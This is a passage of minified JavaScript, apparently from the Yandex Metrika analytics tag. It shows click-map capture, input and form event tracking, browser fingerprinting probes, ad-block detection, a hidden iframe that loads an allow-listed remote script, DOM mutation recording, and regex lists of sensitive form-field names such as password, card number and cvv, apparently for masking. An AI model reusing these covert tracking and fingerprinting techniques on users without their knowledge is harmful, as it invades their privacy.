                Ot(t, n, {
                  Wa: e,
                  Qc: "s",
                  Wd: "ds",
                  xj: function (e, n, r) {
                    var i,
                      o,
                      a = e.Vc;
                    return (
                      (e = e.host),
                      mo(a, "settings")
                        ? eo(Gi("ds.e"))
                        : ((n = n(gr) - r),
                          (r = e[1]),
                          (a = Uc(
                            (((i = {}).di = a), (i.dit = n), (i.dip = r), i)
                          )),
                          ((o = {})["page-url"] = Xi(t).href),
                          (i = o),
                          Sl(
                            t,
                            "S",
                            xd
                          )({ H: a, F: i }, xd).catch(Ur(t, "ds.rs")))
                    );
                  },
                })
              );
          });
        }),
        Td = Io(po(Au("performance.memory.jsHeapSizeLimit"), yo("concat", ""))),
        Sd =
          "video/ogg video/mp4 video/webm audio/x-aiff audio/x-m4a audio/mpeg audio/aac audio/wav audio/ogg audio/mp4".split(
            " "
          ),
        Rd = "theora vorbis 1 avc1.4D401E mp4a.40.2 vp8.0 mp4a.40.5".split(" "),
        Md =
          "prefers-reduced-motion;prefers-reduced-transparency;prefers-color-scheme: dark;prefers-color-scheme: light;pointer: none;pointer: coarse;pointer: fine;any-pointer: none;any-pointer: coarse;any-pointer: fine;scan: interlace;scan: progressive;color-gamut: srgb;color-gamut: p3;color-gamut: rec2020;update: fast;update: slow;update: none;grid: 0;grid: 2;hover: hover;inverted-colors: inverted;inverted-colors: none".split(
            ";"
          ),
        Nd = ["availWidth", "availHeight", "availTop"],
        Dd = ["webgl", "experimental-webgl"],
        Pd = [-0.2, -0.9, 0, 0.4, -0.26, 0, 0, 0.732134444, 0],
        Id = wo(Gi("ccf"), eo),
        Od =
          "appName vendor deviceMemory hardwareConcurrency maxTouchPoints appVersion productSub appCodeName vendorSub".split(
            " "
          ),
        Ld = Xo(Ti)("(ym-disable-clickmap|ym-clickmap-ignore)"),
        jd = Hr("clm.p", function (t, e) {
          if (rc(t)) return qo;
          var n,
            r = Sl(t, "m", e),
            i = Fc(e),
            o = mf(t),
            a = o(gr),
            u = wo(wo(i, rd(t)), po(Wo, Au("clickmap"))),
            c = null,
            s = Pu(t);
          return (
            (i = Ur(t, "clm.p.c", function (i) {
              var f = u();
              if (f) {
                var h = s.l("cls", 0);
                s.o("cls", h + 1);
                var l = (h = "object" == typeof f ? f : {}).filter;
                f = h.isTrackHash || !1;
                var d = Vu(function (t) {
                  return ("" + t).toUpperCase();
                }, h.ignoreTags || []);
                gu(n) && (n = h.quota || null);
                var p = !!h.quota;
                if (
                  ((i = {
                    element: kt(t, i),
                    position: St(t, i),
                    button: Tt(i),
                    time: o(gr),
                  }),
                  (h = Xi(t).href),
                  (function (t, e, n, r, i) {
                    if (
                      ho(t, "ymDisabledClickmap") ||
                      Lf(t) ||
                      !e ||
                      !e.element
                    )
                      return !1;
                    if (
                      ((t = bi(e.element)),
                      (i && !i(e.element, t)) ||
                        (Fu(e.button, [2, 3]) && "A" !== t) ||
                        Wu(ou(t), r))
                    )
                      return !1;
                    if (((r = e.element), e && n)) {
                      if (50 > e.time - n.time) return !1;
                      if (
                        ((i = Math.abs(n.position.x - e.position.x)),
                        (t = Math.abs(n.position.y - e.position.y)),
                        (e = e.time - n.time),
                        n.element === r && 2 > i && 2 > t && 1e3 > e)
                      )
                        return !1;
                    }
                    for (; r; ) {
                      if (Ld(r)) return !1;
                      r = r.parentElement;
                    }
                    return !0;
                  })(t, i, c, d, l))
                ) {
                  if (p) {
                    if (!n) return;
                    --n;
                  }
                  (l = (d = pi(t, i.element))[0]),
                    (d = d[1]),
                    (p = vi(t, i.element)),
                    (l = [
                      "rn",
                      Ki(t),
                      "x",
                      Math.floor((65535 * (i.position.x - p.left)) / (l || 1)),
                      "y",
                      Math.floor((65535 * (i.position.y - p.top)) / (d || 1)),
                      "t",
                      Math.floor((i.time - a) / 100),
                      "p",
                      fi(t, i.element),
                      "X",
                      i.position.x,
                      "Y",
                      i.position.y,
                    ]),
                    (l = iu(":", l)),
                    f && (l += ":wh:1"),
                    (function (t, e, n, r, i) {
                      var o;
                      r(
                        (e = {
                          H: Uc(),
                          F:
                            ((o = {}),
                            (o["page-url"] = e),
                            (o["pointer-click"] = n),
                            o),
                        }),
                        i
                      ).catch(Ur(t, "c.s.c"));
                    })(t, h, l, r, e),
                    (c = i);
                }
              }
            })),
            os(t).C(mo(t, "document"), ["click"], i)
          );
        }),
        Bd = Hr(
          "i.e",
          Io(
            function (t) {
              var e = Pu(t),
                n = e.l("isEU");
              if (gu(n)) {
                var r = ec(Tr(t, "is_gdpr") || "");
                Fu(r, [0, 1])
                  ? (e.o("isEU", r), (n = !!r))
                  : (t = mo((t = pf(t).l("wasSynced")), "params.eu")) &&
                    (e.o("isEU", t), (n = !!t));
              }
              return n;
            },
            function (t) {
              return Pu(t).l("isEU");
            }
          )
        ),
        Fd = (function () {
          function t(t, e) {
            (this.b = t), (this.Sh = e);
          }
          return (
            (t.prototype.Da = function (t) {
              return $n(Yu(yu(this.Ea, this), t));
            }),
            (t.prototype.Ea = function (t, e) {
              var n = this,
                r = [],
                i = this.Sh(this.b, e && e.type, t.type);
              return (
                i &&
                  (r = Yu(function (e) {
                    return e({ b: n.b, ia: t }) || [];
                  }, i)),
                r
              );
            }),
            (t.prototype.La = function (t) {
              return t.length;
            }),
            (t.prototype.ad = function (t) {
              return [t];
            }),
            (t.prototype.isEnabled = function () {
              return !0;
            }),
            t
          );
        })(),
        Gd = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).buffer = []),
              (e.Ng = 7500),
              (e.jd = 3e4),
              e.$c(),
              e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.push = function (t, e) {
              var n = this.sa.Ea(t, e);
              Ji(this.buffer, n),
                this.sa.La(this.buffer) > this.Ng && this.flush();
            }),
            (e.prototype.flush = function () {
              var t = this.buffer;
              t.length && (this.send(t), (this.buffer = []));
            }),
            e
          );
        })(Ul),
        Hd = "metrikaId_" + Math.random(),
        Ud = { sd: 0 },
        Xd =
          "first(-|\\.|_|\\s){0,2}name last(-|\\.|_|\\s){0,2}name zip postal phone address passport (bank|credit)(-|\\.|_|\\s){0,2}card card(-|\\.|_|\\s){0,2}number card(-|\\.|_|\\s){0,2}holder cvv card(-|\\.|_|\\s){0,2}exp card(-|\\.|_|\\s){0,2}name card.*month card.*year card.*month card.*year password email birth(-|\\.|_|\\s){0,2}(day|date) second(-|\\.|_|\\s){0,2}name third(-|\\.|_|\\s){0,2}name patronymic middle(-|\\.|_|\\s){0,2}name birth(-|\\.|_|\\s){0,2}place house street city flat state contact.*".split(
            " "
          ),
        Vd = ["email", "tel"],
        zd = /ym-hide-content/,
        Yd = /ym-show-content/,
        qd = /^[\w\u0410-\u042f\u0430-\u044f]$/,
        Kd = [65, 90],
        Wd = [97, 122],
        Jd =
          "color radio checkbox date datetime-local email month number password range search tel text time url week".split(
            " "
          ),
        $d = new RegExp("(" + iu("|", Xd) + ")", "i"),
        Zd = ["password", "passwd", "pswd"],
        Qd = new RegExp(
          "(" +
            iu(
              "|",
              Xd.concat(
                "имя фамилия отчество индекс телефон адрес паспорт номер(-|\\.|_|\\s){0,2}карты электронная(-|\\.|_|\\s){0,2}почта дата(-|\\.|_|\\s){0,2}рождения дом улица квартира город область".split(
                  " "
                )
              )
            ) +
            ")",
          "i"
        ),
        tp = Io(function () {
          var t;
          return (
            ((t = {}).A = 1),
            (t.ABBR = 2),
            (t.ACRONYM = 3),
            (t.ADDRESS = 4),
            (t.APPLET = 5),
            (t.AREA = 6),
            (t.B = 7),
            (t.BASE = 8),
            (t.BASEFONT = 9),
            (t.BDO = 10),
            (t.BIG = 11),
            (t.BLOCKQUOTE = 12),
            (t.BODY = 13),
            (t.BR = 14),
            (t.BUTTON = 15),
            (t.CAPTION = 16),
            (t.CENTER = 17),
            (t.CITE = 18),
            (t.CODE = 19),
            (t.COL = 20),
            (t.COLGROUP = 21),
            (t.DD = 22),
            (t.DEL = 23),
            (t.DFN = 24),
            (t.DIR = 25),
            (t.DIV = 26),
            (t.DL = 27),
            (t.DT = 28),
            (t.EM = 29),
            (t.FIELDSET = 30),
            (t.FONT = 31),
            (t.FORM = 32),
            (t.FRAME = 33),
            (t.FRAMESET = 34),
            (t.H1 = 35),
            (t.H2 = 36),
            (t.H3 = 37),
            (t.H4 = 38),
            (t.H5 = 39),
            (t.H6 = 40),
            (t.HEAD = 41),
            (t.HR = 42),
            (t.HTML = 43),
            (t.I = 44),
            (t.IFRAME = 45),
            (t.IMG = 46),
            (t.INPUT = 47),
            (t.INS = 48),
            (t.ISINDEX = 49),
            (t.KBD = 50),
            (t.LABEL = 51),
            (t.LEGEND = 52),
            (t.LI = 53),
            (t.LINK = 54),
            (t.MAP = 55),
            (t.MENU = 56),
            (t.META = 57),
            (t.NOFRAMES = 58),
            (t.NOSCRIPT = 59),
            (t.OBJECT = 60),
            (t.OL = 61),
            (t.OPTGROUP = 62),
            (t.OPTION = 63),
            (t.P = 64),
            (t.PARAM = 65),
            (t.PRE = 66),
            (t.Q = 67),
            (t.S = 68),
            (t.SAMP = 69),
            (t.SCRIPT = 70),
            (t.SELECT = 71),
            (t.SMALL = 72),
            (t.SPAN = 73),
            (t.STRIKE = 74),
            (t.STRONG = 75),
            (t.STYLE = 76),
            (t.SUB = 77),
            (t.SUP = 78),
            (t.TABLE = 79),
            (t.TBODY = 80),
            (t.TD = 81),
            (t.TEXTAREA = 82),
            (t.TFOOT = 83),
            (t.TH = 84),
            (t.THEAD = 85),
            (t.TITLE = 86),
            (t.TR = 87),
            (t.TT = 88),
            (t.U = 89),
            (t.UL = 90),
            (t.VAR = 91),
            (t.NOINDEX = 100),
            t
          );
        }),
        ep = [17, 18, 38, 32, 39, 15, 11, 7, 1],
        np = (function () {
          var t =
            "first(-|\\.|_|\\s){0,2}name last(-|\\.|_|\\s){0,2}name zip postal phone address passport (bank|credit)(-|\\.|_|\\s){0,2}card card(-|\\.|_|\\s){0,2}number card(-|\\.|_|\\s){0,2}holder cvv card(-|\\.|_|\\s){0,2}exp card(-|\\.|_|\\s){0,2}name card.*month card.*year card.*month card.*year password email birth(-|\\.|_|\\s){0,2}(day|date) second(-|\\.|_|\\s){0,2}name third(-|\\.|_|\\s){0,2}name patronymic middle(-|\\.|_|\\s){0,2}name birth(-|\\.|_|\\s){0,2}place house street city flat state".split(
              " "
            );
          return {
            qk: new RegExp("(" + iu("|", t) + ")", "i"),
            Ck: new RegExp(
              "(" +
                iu(
                  "|",
                  t.concat(
                    "имя;фамилия;отчество;индекс;телефон;адрес;паспорт;Номер(-|\\.|_|\\s){0,2}карты;дата(-|\\.|_|\\s){0,2} рождения;дом;улица;квартира;город;область".split(
                      ";"
                    )
                  )
                ) +
                ")",
              "i"
            ),
            nk: /ym-record-keys/i,
            Ri: "•",
            Bk: 88,
          };
        })(),
        rp = qu(wo(np.Ri, Ho)),
        ip = !0,
        op = "",
        ap = !1,
        up = !0,
        cp = !1,
        sp = Xo(function (t, e) {
          var n = Eo([t, "efv." + e.event], Ur);
          return (e.M = Vu(po(Ho, n), e.M)), e;
        }),
        fp = Io(function (t) {
          var e = [],
            n = [],
            r = [];
          return (
            t.document.attachEvent &&
              !t.opera &&
              (e.push(vt), n.push(Oa), n.push(La)),
            t.document.addEventListener ? e.push(Ba) : (n.push(ja), r.push(Ba)),
            (function (t, e) {
              var n = Lu(function (t) {
                  return 0 < t.M.length;
                }, e),
                r = Du({ target: t.document, type: "document" });
              return Vu(po(Ho, r, sp(t)), n);
            })(
              t,
              (e = $o(
                [
                  { target: t, type: "window", event: "beforeunload", M: [qo] },
                  { target: t, type: "window", event: "unload", M: [qo] },
                  { event: "click", M: [Ga] },
                  { event: "dblclick", M: [Ga] },
                  { event: "mousedown", M: [Ga] },
                  { event: "mouseup", M: [Ha] },
                  { event: "keydown", M: [za] },
                  { event: "keypress", M: [Ya] },
                  { event: "copy", M: [Xa] },
                  { event: "blur", M: e },
                  { event: "focusin", M: n },
                  { event: "focusout", M: r },
                ],
                !t.document.attachEvent || t.opera
                  ? [
                      { target: t, type: "window", event: "focus", M: [mt] },
                      { target: t, type: "window", event: "blur", M: [vt] },
                    ]
                  : [],
                t.document.addEventListener
                  ? [
                      { event: "focus", M: [ja] },
                      { event: "change", M: [Fa] },
                      { event: "submit", M: [qa] },
                    ]
                  : [
                      { type: "formInput", event: "change", M: [Fa] },
                      { type: "form", event: "submit", M: [qa] },
                    ]
              ))
            )
          );
        }),
        hp = Io(function (t) {
          return $o(
            ki(t)
              ? [{ target: t, type: "document", event: "mouseleave", M: [Ka] }]
              : []
          );
        }),
        lp = ["submit", "beforeunload", "unload"],
        dp = Io(function (t, e) {
          var n = e(t);
          return Cu(
            function (t, e) {
              return (t[e.type + ":" + e.event] = e.M), t;
            },
            {},
            n
          );
        }),
        pp = wo(fp, function (t, e, n, r) {
          return dp(e, t)[n + ":" + r] || [];
        }),
        vp = /^\s*function submit\(\)/,
        mp = /opera mini/i,
        gp = Hr("fw.p", function (t, e) {
          return e.gf || !e.Ta
            ? us.resolve(qo)
            : lt(t, e, new Fd(t, pp), fp, lp);
        }),
        bp = Hr("pr.p", function (t, e) {
          var n, r;
          qi(t) &&
            Sl(
              t,
              "5",
              e
            )(
              {
                H: Uc((((n = {}).pq = 1), (n.ar = 1), n)),
                F:
                  ((r = {}),
                  (r["page-url"] = Xi(t).href),
                  (r["page-ref"] = mo(t, "document.referrer") || ""),
                  r),
              },
              e
            ).catch(Ur(t, "pr.p.s"));
        }),
        yp = po(Mu, Au("0")),
        wp = Hr("c.m.p", function (t, e) {
          return wo(Ft(t, Fc(e)), ht);
        }),
        Ep = Hr("e.a.p", function (t, e) {
          var n = vn(t, e);
          return (
            (n = Eo(
              [
                po(Ho, cu(!0)),
                Lu(
                  Boolean,
                  Vu(wo(n, mo), [
                    "clickmap",
                    "trackLinks",
                    "accurateTrackBounce",
                  ])
                ),
              ],
              Vu
            )),
            e.xh && n(),
            n
          );
        }),
        xp = Hr("cc.i", function (t, e) {
          var n = Eo([t, e], ft);
          xn(t, e, (n = Eo([t, n, 300], Br)));
        }),
        Cp = Hr("s.f.i", function (t, e) {
          return xn(t, e, function (n) {
            (mo(n, "settings.button_goals") ||
              -1 !== Xi(t).href.indexOf("yagoalsbuttons=1")) &&
              (os(t).C(
                t,
                ["click"],
                Ur(t, "c.t.c", po(Au("target"), Eo([t, e], Wa(t, e, 0, st))))
              ),
              on(t, e, "Button goal. Counter " + e.id + ". Init.")());
          });
        }),
        Ap = Hr("p.ai", function (t, e) {
          return new us(function (n) {
            (lc(t) || cc(t)) &&
              n(
                xn(t, e, function (n) {
                  var r;
                  return (n = mo(n, "settings.sbp"))
                    ? ct(t, Nu({}, n, (((r = {}).c = e.id), r)), 10)
                    : qo;
                })
              ),
              n(qo);
          });
        }),
        _p = Hr("8", function (t, e) {
          return xn(t, e, function (n) {
            var r,
              i = mo(n, "settings.sbp");
            return (
              i &&
              Ot(t, n, {
                Wa: e,
                Qc: "8",
                data: Nu({}, i, ((r = {}), (r.c = e.id), r)),
                Wd: "cs",
              })
            );
          });
        }),
        kp = Hr("p.fh", function (t, e) {
          var n, r;
          void 0 === e && (e = !0);
          var i = pf(t),
            o = mf(t),
            a = i.l("wasSynced"),
            u = { id: 3, aa: "0" };
          return e && a && a.time + 864e5 > o(gr)
            ? us.resolve(a)
            : Sl(
                t,
                "f",
                u
              )(
                {
                  H: Uc(((n = {}), (n.pv = 1), n)),
                  F:
                    ((r = {}),
                    (r["page-url"] = Xi(t).href),
                    (r["page-ref"] = t.document.referrer),
                    r),
                },
                u
              )
                .then(function (t) {
                  var e;
                  return (
                    ((e = {}).time = o(gr)),
                    (e.params = mo(t, "settings")),
                    (e.bkParams = mo(t, "userData")),
                    (t = e),
                    i.o("wasSynced", t),
                    t
                  );
                })
                .catch(Ur(t, "f.h"));
        }),
        Tp = ["ecommerce", "user_id", "fpp"],
        Sp = Hr("pa.int", function (t, e) {
          return function () {
            var n,
              r,
              i = Oo(arguments),
              o = ut(i);
            if (!o) return null;
            i = o.sh;
            var a = o.N;
            if (((o = o.Ua), !Ao(a) && !lo(a))) return null;
            var u = Sl(t, "1", e),
              c = Dl(e).url,
              s = mo(a, "__ym.user_id"),
              f = Mu(a),
              h = Fu("__ymu", f),
              l = Fu("__ym", f) && s;
            f = !Rl(e);
            var d = a;
            return (
              d.__ym &&
                (((d = Nu({}, a)).__ym = Cu(
                  function (t, e) {
                    var n = mo(a, "__ym." + e);
                    return n && (t[e] = n), t;
                  },
                  {},
                  Tp
                )),
                Mu(d.__ym).length || delete d.__ym,
                (f = !!Mu(d).length)),
              (s = on(
                t,
                e,
                l
                  ? "Set user id " + s
                  : (h ? "User p" : "P") + "arams. Counter " + e.id,
                l ? void 0 : JSON.stringify(d)
              )),
              (u = u(
                {
                  N: a,
                  H: Uc(((n = {}), (n.pa = 1), (n.ar = 1), n)),
                  F: ((r = {}), (r["page-url"] = c || Xi(t).href), r),
                },
                e
              ).then(f ? s : qo)),
              rn(t, "p.s", u, o, i)
            );
          };
        }),
        Rp = Hr("exps.int", function (t, e) {
          return function (n, r, i) {
            var o, a;
            if ((void 0 === r && (r = qo), n && 0 < n.length)) {
              var u = Sl(t, "e", e),
                c = Dl(e).url;
              return (
                (n = u(
                  {
                    H: Uc(((o = {}), (o.ex = 1), (o.ar = 1), o)),
                    F:
                      ((a = {}),
                      (a["page-url"] = c || Xi(t).href),
                      (a.exp = n),
                      a),
                  },
                  e
                )),
                rn(t, "exps.s", n, r, i)
              );
            }
          };
        }),
        Mp = Hr("y.p", function (t, e) {
          var n = Ln(t, e);
          if (n) {
            var r = Ir(t),
              i = Eo([t, n, e], at);
            Nr(t, r, function (t) {
              t.C(["params"], i);
            }),
              n.Z.C(["params"], po(Au("1"), i));
          }
        }),
        Np = uo("is", function (t) {
          var e = lf(t),
            n = "" + Pc.Ja + Zo("Wjw75ghm7fa7JW8p");
          if (
            Xi(t).hash.substring(1, n.length + 1) === n ||
            e.l("debug_build") === Pc.Ja
          )
            return (
              e.o("debug_build", Pc.Ja),
              si(t, { src: "https://yastatic.net/metrika-static-watch/tag.js" })
            );
        }),
        Dp = Io(oo),
        Pp = po(yo("exec", /counterID=(\d+)/), Au("1")),
        Ip = Xo(function (t, e) {
          var n = Dp(t),
            r = Zi(e),
            i = r[0],
            o = r[1];
          if (((r = r.slice(2)), o)) {
            var a = "" + i,
              u = { id: 1, aa: "0" },
              c = Pp(a);
            c
              ? (u.id = c)
              : -1 === a.indexOf(":")
              ? ((a = ec(a)), (u.id = a))
              : ((c = (a = a.split(":"))[1]),
                (u.id = ec(a[0])),
                (u.aa = Gc(c) ? "1" : "0")),
              (u = (a = [vn(t, u), u])[0]),
              (a = a[1]),
              n[(c = Fc(a))] || (n[c] = {}),
              (n = n[c]),
              "init" === o
                ? u ||
                  Np(t) ||
                  (t["yaCounter" + a.id] = new t.Ya[Pc.$b](Nu({}, r[0], a)))
                : u && u[o] && n.ui
                ? u[o].apply(u, r)
                : ((u = n.qg) || ((u = []), (n.qg = u)), u.push($o([i, o], r)));
          }
        }),
        Op = Hr("dl.w", function (t, e, n) {
          var r = 0;
          return (
            Pr(t, t[e], n) ||
              (r = Br(
                t,
                function () {
                  Op(t, e, n);
                },
                1e3,
                "ec.dl"
              )),
            function () {
              return ro(t, r);
            }
          );
        }),
        Lp = Hr("p.e", function (t, e) {
          var n = vn(t, e);
          if (n) {
            var r = Pu(t);
            n = yu(n.params, n);
            var i,
              o = Ur(t, "h.ee", Eo([t, n], nt)),
              a = function (t) {
                (i = t), t.qa.C(o);
              };
            if (e.jc) return r.o("ecs", 0), Op(t, e.jc, a);
            var u = xn(t, e, function (e) {
              return (
                (e = mo(e, "settings.ecommerce")),
                r.o("ecs", 1),
                e ? Op(t, e, a) : qo
              );
            });
            return function () {
              u.then(function (t) {
                t(), i && i.unsubscribe();
              });
            };
          }
        }),
        jp = Hr("fid", function (t) {
          var e,
            n = qo;
          if (!ko(t.PerformanceObserver)) return n;
          var r = Pu(t);
          if (r.l("fido")) return n;
          r.o("fido", !0);
          var i = new t.PerformanceObserver(
            Ur(t, "fid", function (e) {
              (e = e.getEntries()[0]),
                r.o(
                  "fid",
                  t.Math.round(100 * (e.processingStart - e.startTime))
                ),
                n();
            })
          );
          n = function () {
            return i.disconnect();
          };
          try {
            i.observe((((e = {}).type = "first-input"), (e.buffered = !0), e));
          } catch (t) {}
          return n;
        }),
        Bp = Hr("ecm.a", wo("add", et)),
        Fp = Hr("ecm.r", wo("remove", et)),
        Gp = Hr("ecm.d", wo("detail", et)),
        Hp = Hr("ecm.p", wo("purchase", et)),
        Up = wo("form", mi),
        Xp = wo("form", ci),
        Vp = Io(function (t) {
          return iu("[^\\d<>]*", t.split(""));
        }),
        zp = Io(function (t) {
          return new RegExp(Vp(t), "g");
        }),
        Yp = po(wo("replace", yo), wu([/\D/g, ""]), Wo),
        qp = /\S/,
        Kp = wo(
          [
            "style",
            "display:inline;margin:0;padding:0;font-size:inherit;color:inherit;line-height:inherit",
          ],
          vo
        ),
        Wp = Io(function (t) {
          return (
            ((t = (function (t) {
              return t
                ? po(
                    qu(function (t) {
                      var e = (t = t.split("="))[1];
                      return [t[0], _o(e) ? void 0 : ji(e)];
                    }),
                    go(function (t, e) {
                      return (t[e[0]] = e[1]), t;
                    }, {})
                  )(t.split("&"))
                : {};
            })((t = Xi(t)).search.substring(1)))["_ym_status-check"] =
              t["_ym_status-check"] || ""),
            (t._ym_lang = t._ym_lang || "ru"),
            t
          );
        }),
        Jp = po(Wp, Au("_ym_status-check"), ec),
        $p = po(Wp, Au("_ym_lang")),
        Zp = ["https://iframe-toloka.com/"],
        Qp = bo(
          /^https:\/\/(yastatic\.net\/s3\/metrika|s3\.mds\.yandex\.net\/internal-metrika-betas|[\w-]+\.dev\.webvisor\.com|[\w-]+\.dev\.metrika\.yandex\.ru)\/(\w|-|\/|(\.)(?!\.))+\.js$/
        ),
        tv = ["form", "button", "phone", "status"],
        ev = Io(
          function (t, e, n) {
            n.inline
              ? B(t, n)
              : n.resource &&
                Qp(n.resource) &&
                ((t._ym__postMessageEvent = e),
                (t._ym__inpageMode = n.inpageMode),
                (t._ym__initMessage = n.initMessage),
                (function (t, e) {
                  var n = Es(t);
                  if (n) {
                    n = n("div");
                    var r = _i(t);
                    if (r) {
                      n.innerHTML =
                        '<iframe name="RemoteIframe" allowtransparency="true" style="position: absolute; left: -999px; top: -999px; width: 1px; height: 1px;"></iframe>';
                      var i = n.firstChild;
                      (i.onload = function () {
                        si(i.contentWindow, { src: e });
                      }),
                        (t._ym__remoteIframeEl = i),
                        r.appendChild(n),
                        n.removeChild(i);
                      var o = null;
                      n.attachShadow
                        ? (o = n.attachShadow({ mode: "open" }))
                        : n.createShadowRoot
                        ? (o = n.createShadowRoot())
                        : n.webkitCreateShadowRoot &&
                          (o = n.webkitCreateShadowRoot()),
                        o
                          ? o.appendChild(i)
                          : (r.appendChild(i),
                            (t._ym__remoteIframeContainer = i));
                    }
                  }
                })(t, n.resource));
          },
          function (t, e, n) {
            return n.id;
          }
        ),
        nv = Hr("cs.init", function (t, e) {
          var n,
            r = Jp(t);
          r &&
            e.id === r &&
            "0" === e.aa &&
            (((n = {}).lang = $p(t)),
            (n.fileId = "status"),
            (n.id = "" + e.id),
            Br(t, Eo([t, (r = n)], B), 0, "cs"));
        }),
        rv = Io(function (t) {
          return rc(t) || !zo("querySelectorAll", t.document.querySelectorAll);
        }),
        iv = Io(X),
        ov = Io(ua, Go),
        av = Hr("phc.p", function (t, e) {
          return rv(t)
            ? qo
            : xn(t, e, function (n) {
                var r = e.id,
                  i = sa(t, void 0, r),
                  o = i.l("phc_settings") || "";
                if ((n = mo(n, "settings.phchange"))) {
                  var a = Oi(t, n) || "";
                  a !== o && i.o("phc_settings", a);
                } else o && (n = ov(t, o));
                (i = mo(n, "clientId")),
                  (o = mo(n, "orderId")),
                  (n = mo(n, "phones") || []),
                  i &&
                    o &&
                    n.length &&
                    (Nu(
                      (o = {
                        yb: "",
                        Jb: "",
                        pg: 0,
                        ha: {},
                        ra: [],
                        Lf: !1,
                        $a: !0,
                        b: t,
                        bc: e,
                      }),
                      { Lf: !0 }
                    ),
                    O(t, r, o),
                    (n = Gr(t)),
                    (i = Lr(t, n, 1e3)),
                    (r = yu(O, null, t, r, o)),
                    i.C(r),
                    U(t, n));
              });
        }),
        uv = Hr("phc.h", function (t, e) {
          return (function (t) {
            return (
              oc(t) ||
              vc(t) ||
              /mobile/i.test(ic(t)) ||
              !gu(mo(t, "orientation"))
            );
          })(t) || rv(t)
            ? null
            : xn(t, e, function (n) {
                if (!mo(n, "settings.phchange")) {
                  var r = sa(t, "").l("yaHidePhones");
                  (r = r ? ua(t, r) : ""),
                    (n = mo(n, "settings.phhide") || r) && G(t, e, n);
                }
              });
        }),
        cv = Hr("up.int", function (t, e) {
          return Ur(t, "up.c", function (n, r, i) {
            var o,
              a = vn(t, e),
              u = Ml(t, Fc(e)).warn;
            a
              ? Ao(n)
                ? (((o = {}).__ymu = n),
                  (n = o),
                  (o = a.params) && o(n, r || qo, i))
                : u("Wrong user params")
              : u("No counter instance found");
          });
        }),
        sv = Hr("trigger.in", function (t, e) {
          e.Bg && qn(t, Eo([t, "yacounter" + e.id + "inited"], wi), "t.i");
        }),
        fv = Hr("destruct.e", function (t, e, n) {
          return function () {
            var r = Pu(t),
              i = e.id;
            zu(function (e, n) {
              return ko(e) && Ur(t, "dest.fr." + n, e)();
            }, n),
              delete r.l("counters")[Fc(e)],
              delete t["yaCounter" + i];
          };
        }),
        hv = Hr("fip", function (t, e) {
          if (!dh(t) || Uu(t)) {
            var n = pf(t);
            if (!n.l("fip")) {
              var r = po(
                qu(
                  po(function (e, n) {
                    return Hr("fip." + n, e)(t);
                  }, yu(ga, null))
                ),
                uu("-")
              )(e);
              n.o("fip", r);
            }
          }
        }),
        lv = wo("9-d5ve+.r%7", Ho),
        dv = Hr("ad", function (t, e) {
          if (!e.hb) {
            var n = Pu(t);
            if (!n.l("adBlockEnabled")) {
              var r = function (t) {
                  Fu(t, ["2", "1"]) && n.o("adBlockEnabled", t);
                },
                i = lf(t),
                o = i.l("isad");
              if (o) r(o);
              else {
                var a = wo("adStatus", n.o),
                  u = function (t) {
                    return (
                      r((t = t ? "1" : "2")),
                      a("complete"),
                      i.o("isad", t, 1200),
                      t
                    );
                  },
                  c = Sl(t, "adb", e);
                if (!n.l("adStatus")) {
                  a("process");
                  var s = "metrika/a" + lv().replace(/[^a-v]+/g, "") + "t.gif";
                  !(function (t, e) {
                    var n = t.document;
                    if (Fu(n.readyState, ["interactive", "complete"])) qn(t, e);
                    else {
                      var r = os(t),
                        i = r.C,
                        o = r.Tb,
                        a = function () {
                          o(n, ["DOMContentLoaded"], a), o(t, ["load"], a), e();
                        };
                      i(n, ["DOMContentLoaded"], a), i(t, ["load"], a);
                    }
                  })(t, function () {
                    return c({}, s).then(wo(!1, u)).catch(wo(!0, u));
                  });
                }
              }
            }
          }
        }),
        pv = Hr("suid.int", function (t, e) {
          return function (n, r, i) {
            var o = vn(t, e),
              a = uh(t, Fc(e));
            No(n) || Wi(t, n)
              ? ((n = vo(["__ym", "user_id", n])), o.params(n, r || qo, i))
              : a.error("Incorrect user ID");
          };
        }),
        vv = Hr("guid.int", function (t, e) {
          return function (n) {
            var r = hr(t, e);
            return n && to(t, n, null, r), r;
          };
        }),
        mv = (function () {
          function t(t, e, n) {
            (this.Fi = "wv2.c"),
              (this.Ib = []),
              (this.fa = []),
              (this.b = t),
              (this.J = P(t, this, n, this.Fi)),
              (this.D = e),
              (this.Xa = this.D.Wh()),
              (this.start = this.J.G(this.start, "st")),
              (this.stop = this.J.G(this.stop, "sp"));
          }
          return (
            (t.prototype.start = function () {
              var t = this;
              this.Ib = Vu(function (e) {
                var n = e[0],
                  r = e[2];
                return (e = yu(t.J.G(e[1], n[0]), t)), t.Xa.C(r || t.b, n, e);
              }, this.fa);
            }),
            (t.prototype.stop = function () {
              zu(Wo, this.Ib);
            }),
            (t.prototype.X = function (t) {
              return this.D.ma().X(t);
            }),
            t
          );
        })(),
        gv = ["checkbox", "radio"],
        bv = /pwd|value|password/i,
        yv = Au("location.href"),
        wv = (function (t) {
          function e(e, n, r) {
            return (
              ((n = t.call(this, e, n, r) || this).ja = {
                elements: [],
                attributes: [],
              }),
              (n.index = 0),
              (n.ce = n.J.G(n.ce, "o")),
              (n.vd = n.J.G(n.vd, "io")),
              (n.kd = n.J.G(n.kd, "ao")),
              (n.se = n.J.G(n.se, "a")),
              (n.pe = n.J.G(n.pe, "at")),
              (n.te = n.J.G(n.te, "r")),
              (n.qe = n.J.G(n.qe, "c")),
              (n.qa = new e.MutationObserver(n.ce)),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              this.qa.observe(this.b.document.documentElement, {
                attributes: !0,
                characterData: !0,
                childList: !0,
                subtree: !0,
                attributeOldValue: !0,
                characterDataOldValue: !0,
              });
            }),
            (e.prototype.stop = function () {
              this.qa.disconnect();
            }),
            (e.prototype.kd = function (t) {
              var e = t.target;
              t = t.attributeName;
              var n = this.ja.elements.indexOf(e);
              -1 === n &&
                ((n = this.ja.elements.push(e) - 1),
                (this.ja.attributes[n] = {})),
                this.ja.attributes[n] || (this.ja.attributes[n] = {}),
                (n = this.ja.attributes[n]);
              var r = e.getAttribute(t);
              n[t] = D(this.b, e, t, r, this.D.tc()).value;
            }),
            (e.prototype.vd = function (t) {
              function e(t) {
                var e = jo(n.b)(t, r);
                return -1 === e
                  ? (r.push(t), (t = { Bd: {} }), i.push(t), t)
                  : i[e];
              }
              var n = this,
                r = [],
                i = [];
              zu(function (t) {
